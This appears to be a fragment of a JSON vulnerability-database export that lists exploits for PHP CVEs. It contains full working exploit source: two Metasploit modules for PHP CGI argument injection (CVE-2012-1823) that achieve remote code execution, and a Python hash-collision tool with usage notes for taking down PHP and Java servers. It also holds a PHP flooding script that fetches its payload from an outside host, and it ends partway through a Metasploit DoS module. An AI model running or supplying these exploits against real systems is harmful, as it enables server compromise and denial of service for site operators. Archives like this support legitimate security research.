            "sourceData": "\n                                                ##\r\n# $Id$\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# web site for more information on licensing and terms of use.\r\n#   http://metasploit.com/\r\n##\r\n\r\nload 'lib/msf/core/exploit/http/server.rb'\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 &lt; Msf::Exploit::Remote\r\n    Rank = NormalRanking\r\n\r\n    include Msf::Exploit::Remote::HttpClient\r\n\r\n    def initialize(info = {})\r\n        super(update_info(info,\r\n            'Name'           =&gt; 'PHP CGI Argument Injection',\r\n            'Description'    =&gt; %q{\r\n                When run as a CGI, PHP up to version 5.3.12 and 5.4.2 is vulnerable to\r\n                an argument injection vulnerability.  This module takes advantage of\r\n                the -d flag to set php.ini directives to achieve code execution.\r\n                From the advisory: &quot;if there is NO unescaped \u2018=\u2019 in the query string,\r\n                the string is split on \u2018+\u2019 (encoded space) characters, urldecoded,\r\n                passed to a function that escapes shell metacharacters (the \u201cencoded in\r\n                a system-defined manner\u201d from the RFC) and then passes them to the CGI\r\n                binary.&quot;\r\n            },\r\n            'Author'         =&gt; [ 'egypt', 'hdm' ],\r\n            'License'        =&gt; MSF_LICENSE,\r\n            'Version'        =&gt; '$Revision$',\r\n            'References'     =&gt; [\r\n                    [ &quot;CVE&quot;    , &quot;2012-1823&quot; ],\r\n                    [ &quot;URL&quot;    , &quot;http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/&quot; ],\r\n                ],\r\n            'Privileged'     =&gt; false,\r\n            'Payload'        =&gt;\r\n                {\r\n                    'DisableNops' =&gt; true,\r\n                    # Arbitrary big number. The payload gets sent as an HTTP\r\n                    # response body, so really it's unlimited\r\n                    'Space'       =&gt; 262144, # 256k\r\n                },\r\n            'DisclosureDate' =&gt; 'May 03 2012',\r\n            'Platform'       =&gt; 'php',\r\n            'Arch'           =&gt; ARCH_PHP,\r\n            'Targets'        =&gt; [[ 'Automatic', { }]],\r\n            'DefaultTarget' =&gt; 0))\r\n\r\n        register_options([\r\n            OptString.new('TARGETURI', [false, &quot;The URI to request&quot;]),\r\n            ], self.class)\r\n    end\r\n\r\n    # php-cgi -h\r\n    # ...\r\n    #   -s               Display colour syntax highlighted source.\r\n    def check\r\n        uri = target_uri.path\r\n        if(uri and ! uri.empty?)\r\n            uri.gsub!(/\\?.*/, &quot;&quot;)\r\n\r\n            print_status(&quot;Checking uri #{uri}&quot;)\r\n\r\n            response = send_request_raw({ 'uri' =&gt; uri })\r\n\r\n            if response and response.code == 200 and response.body =~ /\\&lt;code\\&gt;\\&lt;span style.*\\&amp;lt\\;\\?/mi\r\n                print_error(&quot;Server responded in a way that was ambiguous, could not determine whether it was vulnerable&quot;)\r\n                return Exploit::CheckCode::Unknown\r\n            end\r\n\r\n            response = send_request_raw({ 'uri' =&gt; uri + '?-s'})\r\n            if response and response.code == 200 and response.body =~ /\\&lt;code\\&gt;\\&lt;span style.*\\&amp;lt\\;\\?/mi\r\n                return Exploit::CheckCode::Vulnerable\r\n            end\r\n\r\n            print_error(&quot;Server responded indicating it was not vulnerable&quot;)\r\n            return Exploit::CheckCode::Safe\r\n        else\r\n            return Exploit::CheckCode::Unknown\r\n        end\r\n    end\r\n\r\n    def exploit\r\n        #sleep 100\r\n        begin\r\n            php_trues  = [ &quot;1&quot;, &quot;on&quot;, &quot;true&quot; ]\r\n            php_falses = [ &quot;0&quot;, &quot;off&quot;, &quot;false&quot; ]\r\n            args = [\r\n                &quot;-d+allow_url_include%3d#{rand_php_ini_true}&quot;,\r\n                &quot;-d+auto_prepend_file%3dphp://input&quot;,\r\n            ]\r\n\r\n            qs = args.join(&quot;+&quot;)\r\n            uri = &quot;#{target_uri}?#{qs}&quot;\r\n            p uri\r\n\r\n            # Has to be all on one line, so gsub out the comments and the newlines\r\n            payload_oneline = &quot;&lt;?php &quot; +payload.encoded.gsub(/\\s*#.*$/, &quot;&quot;).gsub(&quot;\\n&quot;, &quot;&quot;)\r\n            response = send_request_cgi( {\r\n                'method' =&gt; &quot;POST&quot;,\r\n                'global' =&gt; true,\r\n                'uri'    =&gt; uri,\r\n                'data'   =&gt; payload_oneline,\r\n            }, 0.1)\r\n            handler\r\n\r\n        rescue ::Interrupt\r\n            raise $!\r\n        rescue ::Rex::HostUnreachable, ::Rex::ConnectionRefused\r\n            print_error(&quot;The target service unreachable&quot;)\r\n        rescue ::OpenSSL::SSL::SSLError\r\n            print_error(&quot;The target failed to negotiate SSL, is this really an SSL service?&quot;)\r\n        end\r\n    end\r\n\r\n    def rand_php_ini_false\r\n        [ &quot;0&quot;, &quot;off&quot;, &quot;false&quot; ].sort_by{rand}.first\r\n    end\r\n\r\n    def rand_php_ini_true\r\n        [ &quot;1&quot;, &quot;on&quot;, &quot;true&quot; ].sort_by{rand}.first\r\n    end\r\n\r\nend\n                              ",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:60093"
        },
        {
            "bulletinFamily": "exploit",
            "description": "PHP CGI Argument Injection. CVE-2012-1823,CVE-2012-2311,CVE-2012-2336. Remote exploit for php platform",
            "modified": "2012-05-04T00:00:00",
            "published": "2012-05-04T00:00:00",
            "id": "EDB-ID:18834",
            "href": "https://www.exploit-db.com/exploits/18834/",
            "type": "exploitdb",
            "title": "PHP CGI Argument Injection",
            "sourceData": "##\r\n# $Id$\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# web site for more information on licensing and terms of use.\r\n#   http://metasploit.com/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = ExcellentRanking\r\n\r\n\tinclude Msf::Exploit::Remote::HttpClient\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => 'PHP CGI Argument Injection',\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\tWhen run as a CGI, PHP up to version 5.3.12 and 5.4.2 is vulnerable to\r\n\t\t\t\tan argument injection vulnerability.  This module takes advantage of\r\n\t\t\t\tthe -d flag to set php.ini directives to achieve code execution.\r\n\t\t\t\tFrom the advisory: \"if there is NO unescaped '=' in the query string,\r\n\t\t\t\tthe string is split on '+' (encoded space) characters, urldecoded,\r\n\t\t\t\tpassed to a function that escapes shell metacharacters (the \"encoded in\r\n\t\t\t\ta system-defined manner\" from the RFC) and then passes them to the CGI\r\n\t\t\t\tbinary.\"\r\n\t\t\t},\r\n\t\t\t'Author'         => [ 'egypt', 'hdm' ],\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Version'        => '$Revision$',\r\n\t\t\t'References'     => [\r\n\t\t\t\t\t[ \"CVE\"\t, \"2012-1823\" ],\r\n\t\t\t\t\t[ \"URL\"\t, \"http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/\" ],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => false,\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'DisableNops' => true,\r\n\t\t\t\t\t# Arbitrary big number. The payload gets sent as an HTTP\r\n\t\t\t\t\t# response body, so really it's unlimited\r\n\t\t\t\t\t'Space'       => 262144, # 256k\r\n\t\t\t\t},\r\n\t\t\t'DisclosureDate' => 'May 03 2012',\r\n\t\t\t'Platform'       => 'php',\r\n\t\t\t'Arch'           => ARCH_PHP,\r\n\t\t\t'Targets'        => [[ 'Automatic', { }]],\r\n\t\t\t'DefaultTarget' => 0))\r\n\r\n\t\tregister_options([\r\n\t\t\tOptString.new('TARGETURI', [false, \"The URI to request (must be a CGI-handled PHP script)\"]),\r\n\t\t\t], self.class)\r\n\tend\r\n\r\n\t# php-cgi -h\r\n\t# ...\r\n\t#   -s               Display colour syntax highlighted source.\r\n\tdef check\r\n\t\turi = target_uri.path\r\n\r\n\t\turi.gsub!(/\\?.*/, \"\")\r\n\r\n\t\tprint_status(\"Checking uri #{uri}\")\r\n\r\n\t\tresponse = send_request_raw({ 'uri' => uri })\r\n\r\n\t\tif response and response.code == 200 and response.body =~ /\\<code\\>\\<span style.*\\&lt\\;\\?/mi\r\n\t\t\tprint_error(\"Server responded in a way that was ambiguous, could not determine whether it was vulnerable\")\r\n\t\t\treturn Exploit::CheckCode::Unknown\r\n\t\tend\r\n\r\n\t\tresponse = send_request_raw({ 'uri' => uri + '?-s'})\r\n\t\tif response and response.code == 200 and response.body =~ /\\<code\\>\\<span style.*\\&lt\\;\\?/mi\r\n\t\t\treturn Exploit::CheckCode::Vulnerable\r\n\t\tend\r\n\r\n\t\tprint_error(\"Server responded indicating it was not vulnerable\")\r\n\t\treturn Exploit::CheckCode::Safe\r\n\tend\r\n\r\n\tdef exploit\r\n\t\tbegin\r\n\t\t\targs = [\r\n\t\t\t\t\"-d+allow_url_include%3d#{rand_php_ini_true}\",\r\n\t\t\t\t\"-d+safe_mode%3d#{rand_php_ini_false}\",\r\n\t\t\t\t\"-d+suhosin.simulation%3d#{rand_php_ini_true}\",\r\n\t\t\t\t\"-d+disable_functions%3d%22%22\",\r\n\t\t\t\t\"-d+open_basedir%3dnone\",\r\n\t\t\t\t\"-d+auto_prepend_file%3dphp://input\",\r\n\t\t\t\t\"-n\"\r\n\t\t\t]\r\n\r\n\t\t\tqs = args.join(\"+\")\r\n\t\t\turi = \"#{target_uri}?#{qs}\"\r\n\r\n\t\t\t# Has to be all on one line, so gsub out the comments and the newlines\r\n\t\t\tpayload_oneline = \"<?php \" + payload.encoded.gsub(/\\s*#.*$/, \"\").gsub(\"\\n\", \"\")\r\n\t\t\tresponse = send_request_cgi( {\r\n\t\t\t\t'method' => \"POST\",\r\n\t\t\t\t'global' => true,\r\n\t\t\t\t'uri'    => uri,\r\n\t\t\t\t'data'   => payload_oneline,\r\n\t\t\t}, 0.5)\r\n\t\t\thandler\r\n\r\n\t\trescue ::Interrupt\r\n\t\t\traise $!\r\n\t\trescue ::Rex::HostUnreachable, ::Rex::ConnectionRefused\r\n\t\t\tprint_error(\"The target service unreachable\")\r\n\t\trescue ::OpenSSL::SSL::SSLError\r\n\t\t\tprint_error(\"The target failed to negotiate SSL, is this really an SSL service?\")\r\n\t\tend\r\n\r\n\tend\r\n\r\n\tdef rand_php_ini_false\r\n\t\tRex::Text.to_rand_case([ \"0\", \"off\", \"false\" ][rand(3)])\r\n\tend\r\n\r\n\tdef rand_php_ini_true\r\n\t\tRex::Text.to_rand_case([ \"1\", \"on\", \"true\" ][rand(3)])\r\n\tend\r\n\r\nend\r\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:18834"
        }
    ],
    "CVE-2011-4885": [
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2014-07-01T00:00:00",
            "published": "2014-07-01T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-72458",
            "id": "SSV:72458",
            "type": "seebug",
            "title": "PHP Hash Table Collision Proof Of Concept",
            "sourceData": "\n                                                #! /usr/bin/env python\r\n\r\n&#34;&#34;&#34;\r\nThis script was written by Christian Mehlmauer &#60;FireFart@gmail.com&#62;\r\nhttps://twitter.com/#!/_FireFart_\r\n\r\nSourcecode online at:\r\nhttps://github.com/FireFart/HashCollision-DOS-POC\r\n\r\nOriginal PHP Payloadgenerator taken from https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision\r\n\r\nhttp://www.ocert.org/advisories/ocert-2011-003.html\r\nCVE:\r\nApache Geronimo: CVE-2011-5034\r\nOracle Glassfish: CVE-2011-5035\r\nPHP: CVE-2011-4885\r\nApache Tomcat: CVE-2011-4858\r\n\r\nrequires Python 2.7\r\n\r\nExamples:\r\n-) Make a single Request, wait for the response and save the response to output0.html\r\npython HashtablePOC.py -u https://host/index.php -v -c 1 -w -o output -t PHP\r\n\r\n-) Take down a PHP server(make 500 requests without waiting for a response):\r\npython HashtablePOC.py -u https://host/index.php -v -c 500 -t PHP\r\n\r\n-) Take down a JAVA server(make 500 requests without waiting for a response, maximum POST data size 2MB):\r\npython HashtablePOC.py -u https://host/index.jsp -v -c 500 -t JAVA -m 2\r\n\r\nChangelog:\r\nv6.0: Added Javapayloadgenerator\r\nv5.0: Define max payload size as parameter\r\nv4.0: Get PHP Collision Chars on the fly\r\nv3.0: Load Payload from file\r\nv2.0: Added Support for https, switched to HTTP 1.1\r\nv1.0: Initial Release\r\n&#34;&#34;&#34;\r\n\r\nimport socket\r\nimport sys\r\nimport math\r\nimport urllib\r\nimport string\r\nimport time\r\nimport urlparse\r\nimport argparse\r\nimport ssl\r\nimport random\r\nimport itertools\r\n\r\nclass Payloadgenerator:\r\n    # Maximum recursions when searching for collisionchars\r\n    _recursivemax = 15\r\n    _recursivecounter = 1\r\n    \r\n    def __init__(self, verbose, collisionchars = 5, collisioncharlength = 2, payloadlength = 8):\r\n        self._verbose = verbose\r\n        self._collisionchars = collisionchars\r\n        self._collisioncharlength = collisioncharlength\r\n        self._payloadlength = payloadlength\r\n    \r\n    def generateASPPayload(self):\r\n        raise Exception(&#34;ASP Payload not implemented&#34;)\r\n    \r\n    def generateJAVAPayload(self):\r\n        a = self._computeJAVACollisionChars(self._collisionchars)\r\n        return self._generatePayload(a, self._payloadlength)\r\n    \r\n    def generatePHPPayload(self):\r\n        # Note: Default max POST Data Length in PHP is 8388608 bytes (8MB)\r\n        # compute entries with collisions in PHP hashtable hash function\r\n        a = self._computePHPCollisionChars(self._collisionchars)\r\n        return self._generatePayload(a, self._payloadlength);\r\n    \r\n    def _computePHPCollisionChars(self, count):\r\n        charrange = range(0, 256)\r\n        return self._computeCollisionChars(self._DJBX33A, count, charrange)\r\n    \r\n    def _computeJAVACollisionChars(self, count):\r\n        charrange = range(0, 129)\r\n        return self._computeCollisionChars(self._DJBX31A, count, charrange)\r\n    \r\n    def _computeCollisionChars(self, function, count, charrange):\r\n        hashes = {}\r\n        counter = 0\r\n        length = self._collisioncharlength\r\n        a = &#34;&#34;\r\n        for i in charrange:\r\n            a = a+chr(i)\r\n        source = list(itertools.product(a, repeat=length))\r\n        basestr = &#39;&#39;.join(random.choice(source))\r\n        basehash = function(basestr)\r\n        hashes[str(counter)] = basestr\r\n        counter = counter + 1\r\n        for item in source:\r\n            tempstr = &#39;&#39;.join(item)\r\n            if tempstr == basestr:\r\n                continue\r\n            if function(tempstr) == basehash:\r\n                hashes[str(counter)] = tempstr\r\n                counter = counter + 1\r\n            if counter &#62;= count:\r\n                break;\r\n        if counter &#60; count:\r\n            # Try it again\r\n            if self._recursivecounter &#62; self._recursivemax:\r\n                print(&#34;Not enought values found. Please start this script again&#34;)\r\n                sys.exit(1)\r\n            print(&#34;%d: Not enough values found. Trying it again...&#34; % self._recursivecounter)\r\n            self._recursivecounter = self._recursivecounter + 1\r\n            hashes = self._computeCollisionChars(function, count, charrange)\r\n        else:\r\n            if self._verbose:\r\n                print(&#34;Found values:&#34;)\r\n                for item in hashes:\r\n                    tempstr = hashes[item]\r\n                    print(&#34;\\tValue: %s\\tHash: %s&#34; % (tempstr, function(tempstr)))\r\n                    for i in tempstr:\r\n                        print(&#34;\\t\\tValue: %s\\tCharcode: %d&#34; % (i, ord(i)))\r\n        return hashes\r\n    \r\n    def _DJBXA(self, inputstring, base, start):\r\n        counter = len(inputstring) - 1\r\n        result = start\r\n        for item in inputstring:\r\n            result = result + (math.pow(base, counter) * ord(item))\r\n            counter = counter - 1\r\n        return int(round(result))\r\n    \r\n    #PHP\r\n    def _DJBX33A(self, inputstring):\r\n        return self._DJBXA(inputstring, 33, 5381)\r\n    \r\n    #Java\r\n    def _DJBX31A(self, inputstring):\r\n        return self._DJBXA(inputstring, 31, 0)\r\n    \r\n    #ASP\r\n    def _DJBX33X(self, inputstring):\r\n        counter = len(inputstring) - 1\r\n        result = 5381\r\n        for item in inputstring:\r\n            result = result + (int(round(math.pow(33, counter))) ^ ord(item))\r\n            counter = counter - 1\r\n        return int(round(result))\r\n    \r\n    def _generatePayload(self, collisionchars, payloadlength):\r\n        # Taken from:\r\n        # https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision\r\n    \r\n        # how long should the payload be\r\n        length = payloadlength\r\n        size = len(collisionchars)\r\n        post = &#34;&#34;\r\n        maxvaluefloat = math.pow(size,length)\r\n        maxvalueint = int(math.floor(maxvaluefloat))\r\n        for i in range (maxvalueint):\r\n            inputstring = self._base_convert(i, size)\r\n            result = inputstring.rjust(length, &#34;0&#34;)\r\n            for item in collisionchars:\r\n                result = result.replace(str(item), collisionchars[item])\r\n            post += urllib.urlencode({result:&#34;&#34;}) + &#34;&&#34;\r\n    \r\n        return post;\r\n    \r\n    def _base_convert(self, num, base):\r\n        fullalphabet = &#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;\r\n        alphabet = fullalphabet[:base]\r\n        if (num == 0):\r\n            return alphabet[0]\r\n        arr = []\r\n        base = len(alphabet)\r\n        while num:\r\n            rem = num % base\r\n            num = num // base\r\n            arr.append(alphabet[rem])\r\n        arr.reverse()\r\n        return &#34;&#34;.join(arr)\r\n\r\ndef main():\r\n    parser = argparse.ArgumentParser(description=&#34;Take down a remote Host via Hashcollisions&#34;, prog=&#34;Universal Hashcollision Exploit&#34;)\r\n    parser.add_argument(&#34;-u&#34;, &#34;--url&#34;, dest=&#34;url&#34;, help=&#34;Url to attack&#34;, required=True)\r\n    parser.add_argument(&#34;-w&#34;, &#34;--wait&#34;, dest=&#34;wait&#34;, action=&#34;store_true&#34;, default=False, help=&#34;wait for Response&#34;)\r\n    parser.add_argument(&#34;-c&#34;, &#34;--count&#34;, dest=&#34;count&#34;, type=int, default=1, help=&#34;How many requests&#34;)\r\n    parser.add_argument(&#34;-v&#34;, &#34;--verbose&#34;, dest=&#34;verbose&#34;, action=&#34;store_true&#34;, default=False, help=&#34;Verbose output&#34;)\r\n    parser.add_argument(&#34;-s&#34;, &#34;--save&#34;, dest=&#34;save&#34;, help=&#34;Save payload to file&#34;)\r\n    parser.add_argument(&#34;-p&#34;, &#34;--payload&#34;, dest=&#34;payload&#34;, help=&#34;Save payload to file&#34;)\r\n    parser.add_argument(&#34;-o&#34;, &#34;--output&#34;, dest=&#34;output&#34;, help=&#34;Save Server response to file. This name is only a pattern. HTML Extension will be appended. Implies -w&#34;)\r\n    parser.add_argument(&#34;-t&#34;, &#34;--target&#34;, dest=&#34;target&#34;, help=&#34;Target of the attack&#34;, choices=[&#34;ASP&#34;, &#34;PHP&#34;, &#34;JAVA&#34;], required=True)\r\n    parser.add_argument(&#34;-m&#34;, &#34;--max-payload-size&#34;, dest=&#34;maxpayloadsize&#34;, help=&#34;Maximum size of the Payload in Megabyte. PHPs defaultconfiguration does not allow more than 8MB, Tomcat is 2MB&#34;, type=int)\r\n    parser.add_argument(&#34;-g&#34;, &#34;--generate&#34;, dest=&#34;generate&#34;, help=&#34;Only generate Payload and exit&#34;, default=False, action=&#34;store_true&#34;)\r\n    parser.add_argument(&#34;--version&#34;, action=&#34;version&#34;, version=&#34;%(prog)s 6.0&#34;)\r\n\r\n    options = parser.parse_args()\r\n    \r\n    if options.target == &#34;PHP&#34;:\r\n        if not options.maxpayloadsize or options.maxpayloadsize == 0:\r\n            maxpayloadsize = 8\r\n        else:\r\n            maxpayloadsize = options.maxpayloadsize\r\n    elif options.target == &#34;ASP&#34;:\r\n        if not options.maxpayloadsize or options.maxpayloadsize == 0:\r\n            maxpayloadsize = 8\r\n        else:\r\n            maxpayloadsize = options.maxpayloadsize\r\n    elif options.target == &#34;JAVA&#34;:\r\n        if not options.maxpayloadsize or options.maxpayloadsize == 0:\r\n            maxpayloadsize = 2\r\n        else:\r\n            maxpayloadsize = options.maxpayloadsize\r\n    else:\r\n        print(&#34;Target %s not yet implemented&#34; % options.target)\r\n        sys.exit(1)\r\n\r\n    url = urlparse.urlparse(options.url)\r\n\r\n    if not url.scheme:\r\n        print(&#34;Please provide a scheme to the URL(http://, https://,..&#34;)\r\n        sys.exit(1)\r\n\r\n    host = url.hostname\r\n    path = url.path\r\n    port = url.port\r\n    if not port:\r\n        if url.scheme == &#34;https&#34;:\r\n            port = 443\r\n        elif url.scheme == &#34;http&#34;:\r\n            port = 80\r\n        else:\r\n            print(&#34;Unsupported Protocol %s&#34; % url.scheme)\r\n            sys.exit(1)\r\n    if not path:\r\n        path = &#34;/&#34;\r\n\r\n    if not options.payload:\r\n        print(&#34;Generating Payload...&#34;)\r\n        \r\n        # Number of colliding chars to find\r\n        collisionchars = 5\r\n        # Length of the collision chars (2 = Ey, FZ; 3=HyA, ...)\r\n        collisioncharlength = 2\r\n        # Length of each parameter in the payload\r\n        payloadlength = 8\r\n        generator = Payloadgenerator(options.verbose, collisionchars, collisioncharlength, payloadlength)\r\n        if options.target == &#34;PHP&#34;:\r\n            payload = generator.generatePHPPayload()\r\n        elif options.target == &#34;ASP&#34;:\r\n            #payload = generateASPPayload()\r\n            print(&#34;Target %s not yet implemented&#34; % options.target)\r\n            sys.exit(1)\r\n        elif options.target == &#34;JAVA&#34;:\r\n            payload = generator.generateJAVAPayload()\r\n        else:\r\n            print(&#34;Target %s not yet implemented&#34; % options.target)\r\n            sys.exit(1)\r\n\r\n        print(&#34;Payload generated&#34;)\r\n    else:\r\n        f = open(options.payload, &#34;r&#34;)\r\n        payload = f.read()\r\n        f.close()\r\n        print(&#34;Loaded Payload from %s&#34; % options.payload)\r\n\r\n    # trim to maximum payload size (in MB)\r\n    maxinmb = maxpayloadsize*1024*1024\r\n    payload = payload[:maxinmb]\r\n    # remove last invalid(cut off) parameter\r\n    position = payload.rfind(&#34;=&&#34;)\r\n    payload = payload[:position+1]\r\n    \r\n    # Save payload\r\n    if options.save:\r\n        f = open(options.save, &#34;w&#34;)\r\n        f.write(payload)\r\n        f.close()\r\n        print(&#34;Payload saved to %s&#34; % options.save)\r\n\r\n    # User selected to only generate the payload\r\n    if options.generate:\r\n        return\r\n\r\n    print(&#34;Host: %s&#34; % host)\r\n    print(&#34;Port: %s&#34; % str(port))\r\n    print(&#34;path: %s&#34; % path)\r\n    print\r\n    print\r\n\r\n    for i in range(options.count):\r\n        print(&#34;sending Request #%s...&#34; % str(i+1))\r\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        if url.scheme == &#34;https&#34;:\r\n            ssl_sock = ssl.wrap_socket(sock)\r\n            ssl_sock.connect((host, port))\r\n            ssl_sock.settimeout(None)\r\n        else:\r\n            sock.connect((host, port))\r\n            sock.settimeout(None)\r\n\r\n        request = &#34;POST %s HTTP/1.1\\r\\n\\\r\nHost: %s\\r\\n\\\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\\r\\n\\\r\nConnection: Close\\r\\n\\\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20 ( .NET CLR 3.5.30729; .NET4.0E)\\r\\n\\\r\nContent-Length: %s\\r\\n\\\r\n\\r\\n\\\r\n%s\\r\\n\\\r\n\\r\\n&#34; % (path, host, str(len(payload)), payload)\r\n\r\n        if url.scheme == &#34;https&#34;:\r\n            ssl_sock.send(request)\r\n        else:\r\n            sock.send(request)\r\n\r\n        if options.verbose:\r\n            if len(request) &#62; 400:\r\n                print(request[:400]+&#34;....&#34;)\r\n            else:\r\n                print(request)\r\n            print(&#34;&#34;)\r\n        if options.wait or options.output:\r\n            start = time.time()\r\n            if url.scheme == &#34;https&#34;:\r\n                data = ssl_sock.recv(1024)\r\n                string = &#34;&#34;\r\n                while len(data):\r\n                    string = string + data\r\n                    data = ssl_sock.recv(1024)\r\n            else:\r\n                data = sock.recv(1024)\r\n                string = &#34;&#34;\r\n                while len(data):\r\n                    string = string + data\r\n                    data = sock.recv(1024)\r\n            \r\n            elapsed = (time.time() - start)\r\n            print(&#34;Request %s finished&#34; % str(i+1))\r\n            print(&#34;Request %s duration: %s&#34; % (str(i+1), elapsed))\r\n            split = string.partition(&#34;\\r\\n\\r\\n&#34;)\r\n            header = split[0]\r\n            content = split[2]\r\n            if options.verbose:\r\n                # only print http header\r\n                print(&#34;&#34;)\r\n                print(header)\r\n                print(&#34;&#34;)\r\n            if options.output:\r\n                f = open(options.output+str(i)+&#34;.html&#34;, &#34;w&#34;)\r\n                f.write(&#34;&#60;!-- &#34;+header+&#34; --&#62;\\r\\n&#34;+content)\r\n                f.close()\r\n\r\n        if url.scheme == &#34;https&#34;:\r\n            ssl_sock.close()\r\n            sock.close()\r\n        else:\r\n            sock.close()\r\n\r\nif __name__ == &#34;__main__&#34;:\r\n    main()\n                              ",
            "cvss": {
                "score": 7.8,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:72458"
        },
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2014-07-01T00:00:00",
            "published": "2014-07-01T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-72454",
            "id": "SSV:72454",
            "type": "seebug",
            "title": "PHP Hashtables Denial of Service",
            "sourceData": "\n                                                  \r\n\r\n# Exploit Title: CVE-2011-4885 PHP Hashtables Denial of Service\r\nExploit\r\n # Date: 1/1/12\r\n # Author: infodox\r\n # Software Link: php.net\r\n #\r\nVersion: 5.3.*\r\n # Tested on: Linux\r\n # CVE : CVE-2011-4885 \r\n\r\nExploit\r\nDownload -- http://infodox.co.cc/Downloads/phpdos.txt \r\n\r\n&#60;?php\r\n/*\r\nPHP 5.3.* Hash Colission DoS Exploit by infodox\r\nOriginal version by itz me (opensc.ws)\r\nCVE-2011-4885\r\n\r\nMirrors List:\r\nhttp://www.exploit-db.com/sploits/hashcollide.txt\r\nhttp://compsoc.nuigalway.ie/~infodox/hashcollide.txt\r\nhttp://jrs-s.net/hashcollide.txt\r\nhttp://www.infodox.co.cc/Downloads/hashcollide.txt\r\n\r\nChanges:\r\nDifferent mirror for hashcollide.txt\r\nNow takes target as a command line argument\r\nStatus message printing\r\n\r\nTwitter: @info_dox\r\nBlog: blog.infodox.co.cc\r\nSite: http://www.infodox.co.cc/\r\n*/\r\n$targ = $argv[1];\r\n$x = file_get_contents(&#34;http://jrs-s.net/hashcollide.txt&#34;); // if this doesnt work replace with the mirrors_lst ones...\r\nwhile(1) {\r\n echo &#34;firing&#34;;\r\n $ch = curl_init(&#34;$targ&#34;);\r\n curl_setopt($ch, CURLOPT_POSTFIELDS, $x);\r\n curl_exec($ch);\r\n curl_close($ch);\r\n echo &#34;[+] Voly Sent!&#34;;\r\n}\r\n?&#62;\n                              ",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:72454"
        },
        {
            "bulletinFamily": "exploit",
            "description": "This module uses a denial-of-service (DoS) condition appearing in a variety of programming languages. This vulnerability occurs when storing multiple values in a hash table and all values have the same hash value. This can cause a web server parsing the POST parameters issued with a request into a hash table to consume hours of CPU with a single HTTP request. Currently, only the hash functions for PHP and Java are implemented. This module was tested with PHP + httpd, Tomcat, Glassfish and Geronimo. It also generates a random payload to bypass some IDS signatures.\n",
            "modified": "2017-07-24T13:26:21",
            "published": "2012-05-13T18:59:42",
            "id": "MSF:AUXILIARY/DOS/HTTP/HASHCOLLISION_DOS",
            "href": "",
            "type": "metasploit",
            "title": "Hashtable Collisions",
            "sourceData": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Hashtable Collisions',\n      'Description'   => %q{\n        This module uses a denial-of-service (DoS) condition appearing in a variety of\n        programming languages. This vulnerability occurs when storing multiple values\n        in a hash table and all values have the same hash value. This can cause a web server\n        parsing the POST parameters issued with a request into a hash table to consume\n        hours of CPU with a single HTTP request.\n\n        Currently, only the hash functions for PHP and Java are implemented.\n        This module was tested with PHP + httpd, Tomcat, Glassfish and Geronimo.\n        It also generates a random payload to bypass some IDS signatures.\n      },\n      'Author'        =>\n        [\n          'Alexander Klink', # advisory\n          'Julian Waelde', # advisory\n          'Scott A. Crosby', # original advisory\n          'Dan S. Wallach', # original advisory\n          'Krzysztof Kotowicz', # payload generator\n          'Christian Mehlmauer' # metasploit module\n        ],\n      'License'       => MSF_LICENSE,\n      'References'    =>\n        [\n          ['URL', 'http://www.ocert.org/advisories/ocert-2011-003.html'],\n          ['URL', 'http://www.nruns.com/_downloads/advisory28122011.pdf'],\n          ['URL', 'http://events.ccc.de/congress/2011/Fahrplan/events/4680.en.html'],\n          ['URL', 'http://events.ccc.de/congress/2011/Fahrplan/attachments/2007_28C3_Effective_DoS_on_web_application_platforms.pdf'],\n          ['URL', 'http://www.youtube.com/watch?v=R2Cq3CLI6H8'],\n          ['CVE', '2011-5034'],\n          ['CVE', '2011-5035'],\n          ['CVE', '2011-4885'],\n          ['CVE', '2011-4858']\n        ],\n      'DisclosureDate'=> 'Dec 28 2011'\n    ))\n\n    register_options(\n    [\n      OptEnum.new('TARGET', [ true, 'Target to attack', nil, ['PHP','Java']]),\n      OptString.new('URL', [ true, \"The request URI\", '/' 